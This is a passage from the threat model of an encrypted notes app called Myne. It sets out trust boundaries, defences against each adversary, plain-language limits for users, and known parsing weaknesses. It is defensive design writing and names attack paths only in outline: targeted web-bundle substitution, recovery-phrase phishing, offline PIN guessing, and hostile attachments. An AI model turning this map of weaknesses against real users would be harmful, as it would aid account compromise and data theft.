| TB7 | Code distribution channel (`downloads.myne.md`, a first-party static origin the project operates; package managers fetching from it; private GitHub releases behind it) | Released artifacts authentic to the team's **release-signing** key — which signs the hash list, not the installer | **There is no in-app auto-update, and this row used to say there was.** No updater plugin is built in, no updater block is configured, and nothing in either client ever asks whether a newer version exists — the AI egress guard's denylist in `provider_gate.rs` even bans the string `check_for_update`, which is the only occurrence of it in the tree. The user obtains an update by downloading a new artifact, the same way they obtained the first one. **The two other things this row used to claim were also false, and are corrected here rather than left standing** (`decisions.md` 2026-08-15, entry 0496): releases are **not** code-signed — no Apple Developer ID and no Authenticode certificate exists, so Gatekeeper and SmartScreen warn on every desktop install — and desktop builds are **not** reproducible, nor could a third party check if they were, because every `myne-md` repository is private and there is no public source to rebuild from. What actually holds this boundary today is narrower and worth stating exactly: each release's `SHA256SUMS` is **signed with an offline minisign key** and the user verifies it **manually**, the same hashes are **published on a second origin** (`myne.md`, a different box, repository and deploy chain, so a compromise of one cannot make its lie agree with the other), and **no update channel exists to attack** — a substitution reaches only whoever downloads during the compromise window, never the installed base. Note what the signature does *not* cover: it authenticates the hash list, not the installer, and it is not something the operating system checks. The Android `.apk` is the one artifact carrying an OS-checked signature, because Android refuses to install an unsigned package; that key is unknown to Google Play, so sideloading still warns about provenance. **The project now operates the distribution origin itself**, which is the A15/TB11 shape applied to a native artifact — materially weaker as an attack, because the artifact is installed and *persists* so it can be hashed afterwards, which a re-delivered web bundle never permits. That is a defensible posture — an update channel that does not exist cannot be attacked — but it is a *different* one from the signature-gated updater previously described, and the difference matters to anyone reasoning about A9. Should an updater ship, the crossing condition is the one this row already named: refuse on signature or hash failure, never silently downgrade. Marked the way TB11 marks its own unshipped service worker, because the document already knew how to say this. |
| TB8 | Build pipeline & signing keys (CI runners, the offline minisign release-signing key, the Android release keystore, release-tag credentials) | Authority to produce official releases | Internal team controls. Compromise here is the realistic upper-bound attack against A9. **This row claimed "hardware-backed signing keys" until 2026-08-25 and there are none** (entry 0534, completing the sweep 0496 began): on desktop there is no code-signing key at all, and the Android release keystore is an ordinary file. What holds: the minisign key that signs each release's `SHA256SUMS` is held offline and outside CI, the same hashes are cross-published on a second origin, and there is no auto-update channel a compromised pipeline could push into (TB7). Verification of any of it is manual and opt-in. |
| TB9 | Third-party dependencies (Rust crates, Go modules, npm packages) | Source code that runs inside TB2 and TB5 | Hash-pinned lockfiles checked into the repository, minimal dependency tree, periodic dependency review. A compromised transitive dependency can defeat client-side encryption (A8). |
| TB10 | Browser ↔ desktop clip channel (the keyless browser extension + the native-messaging bridge into the Tauri core) | Nothing secret. The extension is a keyless producer that hands captured plaintext markdown to the core; the bridge carries a scoped, revocable pairing token (create-clip + is-unlocked-status only — never a key, never read/modify/delete). | A user-initiated pairing handshake (in-app Accept/Reject + a short numeric challenge) binding the exact extension ID; the core treats every handed-off byte as hostile input (size caps — 16 MiB note body / 64 MiB per image, UTF-8 validation, no path traversal, re-sniffed MIME, rate limits). The extension runs OUTSIDE TB2 in the hostile browser runtime; root_key/item_key never cross this boundary. Clips save to the vault root with no folder/tag selection, so no vault structure (AS3/AS5) transits the browser; the extension holds no plaintext at rest (capture requires the vault unlocked — no pending-queue). |
| TB11 | Web bundle delivery channel (the origin serving the web client's HTML, JavaScript and wasm to the browser, on every page load) | Nothing. The bundle is *not* trusted the way a TB7 artifact is — but it is nonetheless the code that handles the master password and the decrypted vault, so a breach here is total for that session. | Nothing the browser checks. **This is why TB11 exists rather than being folded into TB7.** TB7's crossing condition is "a cross-published hash the user can compare against a file that persists" — a served bundle satisfies *none* of the three: browsers verify no signature over page resources, the user retains no artifact to hash, and the copy is replaced on every reload so any comparison is of something already gone. The compensating controls are after-the-fact, and one of them is not yet reachable by the person it is for: reproducible builds, per-release hashes written to an append-only record that is **not public today** (entry 0534), a strict content-security policy with zero third-party origins, and — once it is implemented — a service worker pinning the code after first load (which will bound *later* substitution, not first delivery; policy fixed in `decisions.md` 2026-07-26, **not yet shipped**). The adversary is A15. Self-hosting collapses this boundary for the self-hoster's own use — they operate it — and leaves it in place for anyone else using their instance. |
| TB12 | Local model runtime process (a user-installed daemon on the same machine — Ollama today — reached over loopback) | Decrypted note plaintext (AS1) for the duration of one request: whatever the invoked feature sends, which is a note body, a selection, or retrieved chunks. **Amended 2026-08-16 (myne-md/myne#529):** an agent run additionally sends the note-id and title ROSTER of its approved scope, on the model's first `list_scope` call, before it has read any of them. That is AS1 plus AS2-class titles plus the ids, and a `note_id` is a UUIDv7, so it encodes its note's creation time at millisecond resolution (AS6). Naming it here because the sentence above says "nothing else" and a bulk enumeration of notes the model has not read is not covered by it. Nothing else — `root_key` and `item_key` never cross, and Myne sends no vault structure it was not asked to act on. | The user naming a provider. Default is unset, and unset means the path is unreachable rather than disabled (`decisions.md` 2026-08-09). The endpoint is validated loopback-only as a **literal** address, never a resolved one — a name that resolves to `127.0.0.1` today is a name someone else's DNS answers tomorrow. **Why this is not TB2.** TB2's CLI-sidecar bullet earns "everything stays inside TB2" because that sidecar ships inside the desktop bundle itself: it is the same artifact the user already chose to install, built from the same workspace, present in the same `Cargo.lock`, and covered by whatever check they made of that download. (Not by a signature. The bundle carries none that any OS checks, and this sentence said it did until 2026-08-25, entry 0534.) This daemon is separately distributed, absent from `Cargo.lock`, and unaudited by anyone here, so none of that rationale transfers. **Why this is not TB10.** TB10's trust cell reads "Nothing secret… `root_key`/`item_key` never cross this boundary" — true there because the clipper is a keyless *producer*; here AS1 plaintext is exactly what crosses. Residual worth naming: the runtime's listener is unauthenticated loopback, so any local process can reach it (§1 A16). |
| TB13 | Remote AI provider (Ollama Cloud, OpenRouter — a service Myne does not operate) | Decrypted note plaintext (AS1), which **leaves the device**. No key material and no account number. **Amended 2026-08-16 (myne-md/myne#529):** "no vault structure beyond the text of the thing the user asked about" is no longer true for an agent run, and is corrected rather than left standing. A run sends the note-id and title roster of its approved scope, so a folder-scoped run ships that subtree's titles and identifiers off-device on the model's first tool call, and a `note_id` is a UUIDv7 carrying its note's creation time at millisecond resolution. Those ids are stable across runs and sessions, so a provider that retains requests can link them. The payload class is one this model already carries (AS1, AS2, AS6); what changed is which boundary it reaches, and the honest statement is that the roster crosses TB13, not that nothing structural does. | Explicit, one-time consent per provider on a screen that states what leaves the device — recorded **per account, not per device**, so a newly installed device inherits it (`decisions.md` 2026-08-09 states this asymmetry deliberately). Plus a named provider, default unset and unreachable while unset, and TLS anchored on an embedded root bundle. **What Myne cannot promise here, and does not:** the far side's retention, logging and onward routing are unverifiable — OpenRouter is a broker that forwards to model vendors, so "who receives this" is a set Myne can bound only at its first hop. Two structural properties bound the blast radius instead: surfaces that fire without the user asking (ghost-text, auto-tag, embedding) are barred from this boundary at the seam rather than by a setting, and only user-initiated work crosses it. The ChatML special-token defense degrades from structural to behavioural across this boundary — see §7. |

## 4. Protected Against — Specific Mechanisms

For each adversary classified as Strong or Mitigated in Section 1, the specific defense mechanism. This is the cross-product of Sections 1, 2, and 3.

| Adversary | Mechanism |
|---|---|
| **A1. Passive cloud provider** | Client-side encryption before any byte leaves the device (TB2 → TB4). Server (TB5/TB6) stores only ciphertext blobs (AS1, AS2, AS7), opaque version counters (AS6), **per-note blob ids** (the note's UUIDv7 — which carries its creation time; AS6), hashed account identifiers (AS9), and aggregate quota counters (AS17). Root key (AS12), master password (AS10), and recovery phrase (AS11) never leave the client. |
| **A2. Compelled lawful access** | Same architecture as A1. The server cannot disclose what it does not possess. A subpoena forces disclosure of: ciphertext blobs (opaque), hashed account number, current connection IP (transient, no logs), version counter values, **per-note blob ids and therefore each note's creation time** (AS6), aggregate storage size. It cannot force disclosure of: note plaintext, titles, structure, links, tags, `updated_at`, master password, recovery phrase. |
| **A3. Passive network attacker** | TLS 1.3 in transit (TB4) plus client-side E2EE before transit. Two layers of confidentiality; defeating one still leaves the other. |
| **A4. Active network attacker (MitM)** | TLS 1.3 with strict cipher suites and TOFU certificate pinning on native clients — every endpoint is pinned to the leaf certificate captured on first connect; only the *hosted static* pin is deferred (§1 A4). Successful active MitM cannot decrypt note contents (encryption happens above TLS) and cannot deliver a client update at all, because no client fetches one (TB7 — there is no auto-update path for an attacker to occupy). **Native clients only** — the web client has no pinning and no channel binding available to it (§1 A4), so its only transport defence is the browser's trust store; the code-delivery half of the same attack is A15 / TB11. |
| **A5. Lost / stolen device (locked)** | At-rest encryption (AS1, AS3–AS7 inside the encrypted blobs in TB3). The root key is derived via Argon2id from the master password, which is not stored. Device disk in isolation is opaque ciphertext — with the one exception the user creates: a recovery-phrase or account-number file saved from the creation flow (TB3) onto that same disk is plaintext, and this row's guarantee does not extend to it. Owner-only permissions bound which local account can read such a file; they are no defence against whoever holds the disk. On mobile the export directory is now declared excluded from iCloud Backup and Android Auto Backup (TB3, myne-md/myne#491), so that file is not *meant* to leave the device with the platform's automatic backup; TB3 states what has and has not been observed about that exclusion, and this row is about the disk regardless, where the file is plaintext exactly as stated. **Exception — PIN quick-unlock:** the PIN provider places a third wrapped copy of `root_key` (`vault.quickunlock`) on that same disk, so the disk is not opaque in isolation — it is guarded by PIN entropy × the vault's Argon2id cost and is offline-brute-forceable; see §1 A5 and §7. The biometric provider does not have this property: its wrap key is held non-exportably by the OS. |
| **A9. Compromised build / distribution** | **This row claimed reproducible builds and code-signed releases; it has neither on desktop** (corrected 2026-08-15, entry 0496). Desktop artifacts are not reproducible, the source they would be reproduced from is private, and no Apple Developer ID or Windows Authenticode certificate exists — so the `.dmg`, `.deb`, `.AppImage` and `.pkg.tar.zst` carry no signature any OS checks. **The Android `.apk` is the one exception and it is worth naming rather than rounding away:** it is signed with Myne's own release key because Android refuses to install an unsigned package, so on that platform the OS *does* verify integrity at install and enforces the same key on every later update. That key is unknown to Google Play, which is why sideloading still warns — the warning is about provenance, not about an absent signature. What is actually in place: a **minisign-signed `SHA256SUMS`** per release, whose key is held offline and on neither server, so whoever holds the distribution origin cannot forge a hash list to match a substituted binary; the **same hashes published on a second origin** with its own repository and deploy chain, so a single-host compromise is visible as a disagreement rather than invisible; and **no auto-update**, so there is no update path to verify and none to attack — a replacement binary reaches the user only by their own download, where the signature and the cross-published hash are what they check against (TB7). The remaining gap is that verification is **manual and opt-in**: a user who downloads and runs without checking is protected by none of it. |
| **A11. Insider threat (Myne team)** | The architecture grants the team no privileged access. Insiders see what an external attacker on the server (A1) sees — opaque ciphertext. The single privileged asset is the release-signing key (TB8), meaning the offline minisign key that signs each release's hash list, together with the Android release keystore; compromise reduces to A9. There is no desktop code-signing key to hold, which is itself a gap rather than a reassurance (§1 A9). **Native clients only.** On the web client the team additionally operates the code-delivery channel (TB11), which is privileged access by construction — see A15 for what is and is not done about it. |
| **A15. Hostile delivery of the client code (web)** | Nothing prevents targeted first delivery; the mechanisms are detection and containment. Reproducible bundle builds so a third party can rebuild and compare, **scoped to a reference build environment** (`linux/amd64`, `web/container/Dockerfile`) rather than to every host, because Cargo hashes the build host's target triple into every crate's `-C metadata` and no stable-toolchain flag removes it: any host can enter that environment through emulation, and a rebuild from outside it differs for reasons that are not evidence of anything (`web-bundle-hashes.md`, entry 0498); per-release bundle hashes written to an append-only record so a substitution is detectable after the fact, **except that the record is not public today** (it lives in a private repository, so the reader this control addresses cannot open it; §5 says the same and entry 0534 records it as a gap rather than a control); a service worker that **will** pin the loaded code so a substitution shipped later cannot reach a running session (policy fixed in `decisions.md` 2026-07-26; **not yet implemented**, so today nothing bounds a later substitution either); a strict content-security policy with zero third-party origins so the bundle is the entire attack surface; and cross-origin isolation, which the client needs anyway. Self-hosting removes the third party entirely for the self-hoster's own use. |
| **A18. Recovery-phrase phishing (web)** | Containment only, and it is weaker than what it replaced. The phrase is asked for on the web client in **exactly one** situation, a recovery the user started themselves: phrase-credential *device enrolment* is a decided absence there (`decisions.md` 2026-08-15, entry 0514), kept out of the artefact by build-time module substitution plus `scripts/check-web-no-phrase.mjs`, so no routine flow ever trains a user that typing 24 words into a page is normal. The creation and recovery surfaces state where the phrase is legitimately asked for; the origin is HSTS-preloaded, which binds the HONEST origin to TLS and says nothing about a lookalike, so it belongs with the controls listed above as irrelevant to this adversary rather than with the two that bear on it. **Nothing here prevents** a user from typing the phrase into a lookalike origin, and no delivery-channel control touches this adversary. Native clients are structurally unaffected. |
| **A14. Compromised extension build** | Keyless capability-handoff (the extension never receives root_key/item_key — TB10), an append-only scoped pairing token (create-clip only — never read/modify/delete), render-safe-by-construction ingest (DOMPurify allowlist, no script execution, serve-time re-sniff), and no core-side network fetch (all bytes originate from in-page capture). Save-to-root means no vault structure transits the browser. Damage is bounded to writing visible, deletable clip notes. |

## 5. NOT Protected Against

Written in plain language for users. If any of these scenarios apply to your threat model, Myne alone is not sufficient.

- **You forget your master password and lose your recovery phrase.** Your data is unrecoverable. We cannot help. There is no "forgot password" email, no admin reset, no backdoor. This is the deliberate cost of zero-knowledge.
- **Someone is physically watching your screen.** Open notes are visible to anyone looking at your unlocked device. Myne does not auto-hide content.
- **Someone is watching your screen while the device is *locked*, and you keep more than one vault.** The picker you choose a vault from appears before you unlock anything, and it shows the name you gave each vault this device has opened at least once. Anyone who can see that screen reads those names without knowing your password, and without touching the device. Settings → Privacy → **hide vault names** takes them off that screen and destroys the keys the cached names were sealed under, so they cannot come back; what it cannot do is unsee a screen somebody already read, and it can only keep a name from ever being cached if you turn it on before that vault's first unlock here. With names hidden, the picker still shows one row per vault, still numbers them, and still tells that observer how many vaults you keep, when each was last opened, and the order in which you created them. (A5)
- **Someone takes your laptop or phone while it is unlocked and signed in, *during* the active window.** Auto-lock on idle zeroizes your keys and clears the open note after a period of inactivity (A6 is now 🔒 Mitigated), but if an attacker grabs the device while you are actively using it — before the idle timer fires — your notes are decrypted in memory and exposed. Auto-lock narrows this window; it does not eliminate it. Forensic RAM capture, swap, and hibernation are not scrubbed and stay out of scope (A7/A10). (A6)
- **You turned on PIN quick-unlock and someone takes your locked device.** With PIN unlock off — the default — a stolen locked device is guarded by your master password, which the device never stores anywhere. Turning it on puts a copy of your vault key on the same disk, wrapped by your PIN, so whoever holds that disk can guess PINs offline, on their own hardware, with no attempt limit (the limit Myne enforces applies only to guesses made through the app). Six digits plus Myne's deliberately slow key derivation makes that expensive, not impossible. If a stolen device is in your threat model, leave PIN unlock off, or use the biometric option where your device offers it — that key stays in hardware and cannot be copied off. (A5)
- **Malware is running on your device with your user permissions.** A keylogger reads your master password. A screen scraper reads your decrypted notes. Active malware defeats any user-mode encryption — no notes app can defend against this. (A7)
- **Someone forces you to enter your password.** Coercion, "rubber-hose cryptanalysis", or legal compulsion to disclose. Myne does not implement plausibly-deniable encryption. The data is exposed. (A12)
- **A nation-state-class adversary targets you specifically.** Zero-day exploits against your operating system, hardware implants, supply-chain attacks against the release-signing key. We use boring well-vetted primitives and publish the spec, but we do not claim protection at this level. (A10)
- **Traffic analysis reveals usage patterns.** A network observer or the sync server can see *that* you synced and *roughly how much* (blob count and size), even though they cannot see *what*. Myne does not pad or randomize sync timing in v1. (A13)
- **Someone learns your account number.** Your account number is not a password, but it is not nothing either. Anyone who has it can ask the sync server for your account's encrypted key file from anywhere in the world, with no device of yours and no login — that is how a new device of *yours* joins, and the server cannot tell the two apart. The file does not reveal anything on its own; what it gives someone is the material to start guessing your master password on their own hardware, for as long as they like, with nothing to slow them down but the strength of that password. So treat the number like cash rather than like a username: it is fine to type into your own devices, and it is not something to post in a screenshot or a support thread. (This applies only if you use sync. A local-only vault has nothing on a server.)
- **Someone in your household reads your recovery phrase.** The phrase is bearer-secret. Anyone with the phrase becomes you. Store it like cash, not like a password.
- **Files you export are not protected.** When you export a note or your vault as plain markdown, export a PDF, or export attachments, the resulting files are ordinary unencrypted files. Myne encrypts what it stores; it does not protect what you deliberately take out. Anyone who can reach where they landed can read them. **The recovery phrase and account number you can save to a file from the creation screen work the same way**: the result is an ordinary plain-text file, and anyone who reads that phrase can open your vault. Where your operating system supports it, Myne writes that file readable only by your own user account, and never touches it again. After that, protecting it is yours.
- **On a phone or tablet, you do not choose where an exported file goes.** On a computer and in the browser, Myne asks you where to save. Neither iPhone nor Android gives an app a way to ask that, so on those the file lands in the app's own `Documents` folder and the app then offers you the system share sheet. Two consequences worth knowing. Your phone's automatic cloud backup normally copies that folder to iCloud or Google Drive, which would carry a saved recovery phrase off your device; Myne now tells both systems to leave that folder out of the backup, though we have not yet been able to confirm on a real device that they obey. And if you saved a recovery phrase on a phone before that change, a copy of it is already in an existing backup and nothing in the app can reach in and remove it. If that applies to you, treat the phrase as exposed and create a new vault.
- **You use the web client, and whoever serves it decides to target you.** The desktop and mobile apps are downloaded once and stay installed, so a substituted copy reaches only that one download and, if you kept the file you downloaded, it is still on your disk to compare against the hash we publish for the current release. Nothing does that comparison for you: it is manual and opt-in, and a user who downloads and runs without checking is protected by none of it. There is no Windows build and no installable iOS build to check. Two things this bullet used to claim are not true and are corrected here rather than left standing (entry 0534, extending 0496's correction of TB7 and A9 into this section, which that sweep missed): the desktop installers carry **no signature your operating system checks**, and nothing verifies a signature at launch. Only the Android package is OS-verified, because Android refuses to install an unsigned one. The web client is different in a way none of that repairs: it is re-sent to your browser every time you open the page, and your browser checks nothing on it. That means the operator of the web address (us, for the hosted version; you or whoever runs it, for a self-hosted one) is able to send *you specifically* a modified version while everyone else gets the normal one, and the modified version would see your password as you type it. We record a hash of every released bundle before it is deployed, and the origin republishes it, so a substitution is detectable to anyone who has the record. That record lives in a private repository today, so it is not something you can check independently, which is a gap and not a control. Catching a substitution afterwards would not stop it from reaching you either, and the app does not warn you in the moment. If this is in your threat model, use the desktop or mobile app, which do not have this property, or run your own copy of the web client. (A15)
- **A fake site asks you for your recovery phrase, and you give it.** Myne's web client asks for your 24 words in exactly one place: a recovery *you* started, after forgetting your password. It never asks for them to sign you in and never asks for them to add a device. That is the whole rule, and it is worth learning, because anyone who gets those words plus your account number can open your vault from anywhere, read everything in it, and keep reading it forever: the phrase does not change when you change your password, and there is no way to revoke it. Until 2026-08-15 (entry 0514) you did not need the rule, because the web version could not create an account or recover one and so had no reason to ever ask. It can now, so the rule replaces what used to be a simple fact. Check the address before you type those words, and if anything reached you as a link in a message or an email, do not type them at all. Desktop and mobile do not have this problem: an app on your machine cannot be impersonated by a web address. (A18)
- **A browser extension you installed can read what is on the page.** Extensions you grant access to a site can read everything that site displays and everything you type into it — your recovery phrase while it is on screen, the words you type when recovering, and your master password every time you unlock. This is how browser extensions work; no setting in Myne changes it, and the page cannot detect it. If you are not certain about every extension in your browser profile, create your account and do any recovery in the desktop or mobile app, or use a clean browser profile for those steps. (A19)
- **You install a compromised plugin** (when plugin support eventually ships). Plugins run inside the trust boundary of the client and can read decrypted notes. v1 has no plugin API for this reason; future plugin support will be capability-scoped from the first design.
- **The sync-server operator** (us, when you use hosted sync; you, when you self-host) **acts maliciously.** The protocol is symmetric — the server cannot decrypt your notes. But a malicious operator can refuse service, retain ciphertext after deletion, or correlate metadata. The architecture limits damage; it does not prevent operator misbehavior of these kinds.
- **A browser extension you installed is compromised by a malicious update.** Myne's clipper extension is keyless — even fully compromised, it cannot read, decrypt, or delete your notes (it can only *create* clips, and only while your desktop vault is unlocked). The worst it can do is write misleading or spam notes into your vault; those render safely and you can see and delete them. It cannot exfiltrate your vault. (A14)

## 6. Compensating Controls (no audit budget)

Myne has no budget for a paid third-party cryptographic audit. The substitute is a layered set of public, free, verifiable controls. Each control is a real engineering commitment, not a marketing line.

- **Public protocol specification** — `spec/protocol.md`. KDF parameters, AEAD construction, key hierarchy, recovery derivation, account-number scheme, sync wire format. Detailed enough that an academic cryptographer can review it without source-code archaeology.
- **Public threat model** — this document. Updated in the same change as any architectural shift that affects guarantees.
- **Public statement of limits** — §5 (*NOT Protected Against*) and §7 (*Known Limitations & Open Issues*) of this document. There is no separate `limits.md`; these two sections are the limits of record, and §5 is written in plain language for exactly this purpose. Marketing and in-product copy is reviewed against them, and copy that claims more than they allow is rejected. The order is normative (this document's preamble): downgrade the claim to match, or change the threat model first — with a `decisions.md` entry justifying the change — and only then the copy. Never ship the copy and fix the threat model afterwards.
- **Reproducible builds** — **shipped for the web bundle and the server image; not for desktop.** The web bundle rebuilds byte-identically **in a reference build environment** (`linux/amd64`, built from `web/container/Dockerfile`, reachable from any host through emulation), and every released hash goes to an append-only record (`web-bundle-hashes.md`) that is **not public today**, so the outsider this control is for cannot read it (entry 0534). The qualifier is load-bearing rather than cosmetic: a rebuild on a different architecture differs, because Cargo hashes the build host's target triple into every crate's `-C metadata` and that reaches the emitted wasm, so a third party verifies by entering the reference environment rather than by building natively (entry 0498). Desktop artifacts are built locally, are not reproducible, and — with every `myne-md` repository private — have no public source to be reproduced *from*. This bullet described all three as done; it is corrected here rather than left as a compensating control the project does not have (entry 0496).
- **Signed release hashes, not code-signed releases** — each release's `SHA256SUMS` is signed with an offline minisign key and cross-published on a second origin; the desktop installers themselves are **unsigned**, so the OS warns on install (the Android `.apk` is signed, because Android requires it). There are no auto-update payloads to sign, because there is no auto-update (TB7). Apple Developer ID and Windows Authenticode remain unpurchased; this bullet claimed both were in use.
- **Hash-pinned dependencies** — lockfiles checked into the repository for npm, Go modules, and any WASM artifacts. Dependency updates require explicit review.
- **`SECURITY.md` + `.well-known/security.txt`** — vulnerability disclosure policy with a clear contact channel and acknowledged response window.
- **Public bug bounty (acknowledgment-only acceptable in v1)** — a documented page listing past reports and the researchers credited. Cash bounties may follow once the project sustains revenue.
- **Spec-then-bounty cadence** — protocol changes ship as drafts with a public review period before they reach production clients. The privacy-research community is invited to comment.
- **Engagement with the privacy-research community before HN launch** — informal review by at least one external cryptographer or security researcher, with their feedback acknowledged in release notes. Not equivalent to a paid audit, but materially better than silence.
- **Native screen-capture exclusion (Windows 10 build 19041+ only; the macOS call is retained but nothing is claimed for it).** `tauri::WebviewWindow::set_content_protected(true)` is applied at app startup, wrapping `WDA_EXCLUDEFROMCAPTURE` on Windows and `NSWindowSharingNone` on macOS. Best-effort defense-in-depth layer within A7's existing classification — does not change A7's best-effort status. **This layer ONLY affects OS-level capture paths; it does NOT defend against active in-process malware (keyloggers, framebuffer scrapers, V8 string-heap inspection).** The per-platform reality is asymmetric and is stated per platform rather than as one sentence, because a single sentence is what made this item overclaim for a year (`decisions.md` 2026-08-15, which supersedes the macOS clause of 2026-05-27 "Screen-capture protection: per-platform best-effort discipline"):
  - **Windows 10 build 19041+ — effective, and this is the one platform where the layer earns its place.** The main window is excluded from every capture path the Desktop Window Manager composes: OS screenshot APIs, `Windows.Graphics.Capture`, DXGI Desktop Duplication, Microsoft Recall, and the third-party remote-control tools that ride those pipelines. It does **not** cover three classes. (1) Modes where DWM is not composing — Microsoft's own reference states the feature "works only when the Desktop Window Manager(DWM) is composing the desktop", and legacy mirror-driver capture modes disable composition to work. (2) Capture below the compositor, at the GPU or kernel level. (3) Any process running as the user, which can reset the affinity to `WDA_NONE`; that is already inside A7's assumption and is the reason this is a layer and not a boundary. Microsoft additionally disclaims the API as a security or DRM guarantee in the reference itself. Windows builds below 19041 silently degrade `WDA_EXCLUDEFROMCAPTURE` to `WDA_MONITOR` (a black box, not exclusion) rather than failing.
  - **macOS — the call is made, no protection is claimed.** Apple's own API reference documents `NSWindowSharingNone` as "a legacy constant that macOS no longer uses" and instructs developers not to use it to hide content from capture; Apple Developer Technical Support states there are no public APIs for preventing screen capture. The call is retained because it still has an observable effect on some capture paths and costs nothing to keep, but **Myne claims no macOS coverage, including against remote-control screen sharing.** The symbol is not formally deprecated, so no compiler warning, lint or repo guard signals this — the claim can only be kept honest by this document.
  - **Linux — no protection applied, on any display server.** Neither X11 nor Wayland lets an application request exclusion (§7).

  Users in environments where untrusted screen recording or remote control is active should not rely on this layer, and on macOS and Linux should not expect it at all.

## 7. Known Limitations & Open Issues

Items that are acknowledged as imperfect today and will be revisited. Captured here to prevent silent drift.

- **A failed web account creation can leave a registered account nobody can reach (myne-md/myne#174).** Where sync is required, creation runs `commit` -> `sync_set_endpoint` -> `sync_enroll` and only then displays the phrase, so a failure never leaves a user holding words for an account that does not exist. The rollback on that failure path is **local only**: it deletes the OPFS container and cancels the session. `sync_enroll` registers the account server-side before it seeds `vault.meta`, so a failure after registration leaves durable state across **TB5** — the Argon2id SCRAM verifier (**AS13**), and in the late case the seeded `vault.meta`, which §7's pre-auth `GET /vault.meta` bullet describes as the complete offline password-cracking target — for an account whose number the client has just discarded. No user path can reach it to delete it. Both payloads are ones TB5 is already trusted with, so this is an at-rest residue rather than a boundary violation, and it is recorded rather than mitigated: the compensating server-side abandon call, or retaining the account number so a retry re-enrols into the same registration instead of orphaning it, is owed. The E2E covers only total failure (a dead sync origin, so registration never lands); the partial case is untested.

- **Recovery-phrase-only model has a known UX cost.** Bitwarden, 1Password, and Standard Notes all bleed users at this exact step. Myne holds the line in v1; if support volume becomes unmanageable, the response will be better UX (forced phrase confirmation, optional encrypted recovery file written to user-controlled storage) — *not* email recovery. Any change here triggers a threat-model amendment.
- **On-device OCR widens the untrusted-input parsing surface (MYND-441; TB9).** Image OCR adds an ML runtime (`rten` plus its gemm/SIMD/tensor/model-file/shape-inference crates and `flatbuffers`), three image decoders, and a PDF XObject/`FlateDecode` path — all of which parse **attacker-influenceable bytes** in the same process that holds `root_key`, in **every** build including the `--no-default-features` auditable one, and on mobile as well as desktop. The ingress is real, and **the routes are not the ones this sentence used to name** (corrected 2026-08-29, myne-md/myne#510; `decisions/ai/0542`). On every client an attachment the user **attaches** (file picker, paste or drop) carries bytes they did not author, and so does one that arrives by **sync** from a compromised second device; the shared sniffer (`core/src/plugins/attachments/sniff.rs`) admits anything on the `ALLOWLISTED_CONTENT_TYPES` list by magic bytes, and the parsing rows are gated on the sniffed type. On mobile the **OS share sheet** (**AS19**) is a third. The **browser clipper** (**TB10**) is *not* one today on either client: its per-image `attachment_import` seam is unimplemented, and `resniff_image`, which reads like the filter that would bound it, has no production caller and delegates to that same allowlist sniffer, so it narrows nothing. It becomes an ingress when that seam lands. This sentence previously named only the share sheet and the clipper, which **understated** the surface on desktop, where neither exists: a reader could conclude desktop parsing takes no attacker-influenceable input at all, which would license removing one of the limits below. Understating a guarantee is the same defect as overstating one. This is the same class as the Mermaid/embedded-HTML render surface already recorded here, and it is mitigated the same way rather than by trusting the input: everything is **pure Rust with no C/C++ decoder** (chosen over an `onnxruntime` binding and a PDF rasterizer precisely for this reason), the decoder runs under explicit pixel-dimension limits so a compression bomb is a clean `Failed` rather than an allocation abort, and both the decode and the model passes are wrapped in `catch_unwind` so one hostile attachment cannot abort an index build. Adversary impact is **A7**-class (an attacker who can already place a file on the device), which is best-effort in this model; no new adversary gains a capability, and no key material or plaintext crosses a boundary it did not already cross. Recorded because the dependency surface — not the data flow — is what changed.

  **The audio-decode path is the same shape and is now bounded on both clients (myne-md/myne#485 for mobile, myne-md/myne#510 for desktop).** A voice attachment reaching transcription is attacker-influenceable by the routes named above, and its WAV header declares the sample rate the decoder resamples from, so a declared rate far below 16 kHz expands the decoded buffer by the ratio. Both clients clamp the declared rate to `4_000..=384_000`, and both refuse a clip whose projected 16 kHz length passes a ceiling **derived from the § 9.9 attachment cap** (`protocol::MAX_ATTACHMENT_LEN / 2` output samples) rather than picked. The refusal is taken inside the parser, before the buffers are materialised rather than inside the resampler after them, and above the identity fast-path rather than below it, so a clip already at 16 kHz is measured too. The outcome is a clean typed refusal instead of an allocation abort or an OOM kill. Desktop reached this second: until myne-md/myne#510 its ceiling was derived from an 8-hour duration, which the attachment cap and the 4x clamp together put permanently out of reach, so the check was dead code and the worst case was roughly 768 MiB of live allocation across the four buffers a decode holds. It is now **320 MiB**, measured, and the number needs its shape stated: the peak falls at the RESAMPLE, at a declared rate just above 16 kHz, where the identity fast-path no longer applies and a second output buffer is allocated beside the mono one. At exactly 16 kHz the resampler returns its input by value and the peak is 256 MiB at the downmix instead. A first draft of this paragraph recorded that lower figure by measuring only the identity path. **Two residuals remain, and neither is closed by the above.** The recorder's own per-clip boundary counts samples rather than seconds, so on a capture device below 16 kHz it is clamped to the transcribable frame count as well, and the recorder additionally refuses to start at all outside the same `4_000..=384_000` window the decoder clamps to. The two together keep the invariant that no clip a Myne client records is refused by a Myne decoder: the first holds the length axis and the second the rate axis, and the length clamp alone leaves the invariant false for a device reporting below 4 kHz. That pair is a construction rather than a guarantee the format carries, and a WAV produced anywhere else is still refused on its merits. The rate refusal is not a defence against an adversary and is not claimed as one: the recorder's rate comes from the OS rather than from attacker-controlled bytes, unlike the decoder's copy of the same window. And **the wall clock is bounded by nothing**: an accepted clip at the ceiling is about 34 min 57 s of audio transcribed inside one `spawn_blocking`. Desktop's `transcribe_streaming` yields a `ControlFlow` per segment, so Stop and the vault-lock teardown reach the loop; mobile registers no cancel command, so there the attacker's best move changes axis rather than disappearing, from an allocation abort to pinning a core for many minutes on one tap. A7's rating does not move: this is availability of the app on the user's own device, not confidentiality, and an attacker who can place a file already has the ingress the row assumes.
